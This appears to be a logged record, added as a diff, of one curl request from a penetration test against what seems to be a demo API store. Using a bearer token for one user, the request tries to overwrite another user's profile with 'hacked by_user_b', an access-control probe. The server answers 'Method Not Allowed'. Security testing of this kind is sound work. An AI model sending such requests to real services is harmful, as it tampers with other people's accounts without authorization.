@@ -1,0 +1,7 @@
+# command: curl -s -X PUT -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZTBiNDIwZGYtZTZjOC00M2M3LWIyMDMtYzQyMTVkYTgyZGRmIiwidXNlcm5hbWUiOiJ1c2VyX2JfMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3OTA2NDk3MDV9.cmwPBopMLCfej8-N6owLuXHBlirXbVhTMwJYnxsOBzE" -H "Content-Type: application/json" -d '{"first_name":"hacked","last_name":"by_user_b"}' "https://duck-store.escape.tech/api/v1/users/cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d"
+# tool: curl
+# exit_code: 0
+# ts: 2026-09-29T02:16:20.607101+00:00
+# ---
+
+{"detail":"Method Not Allowed"}
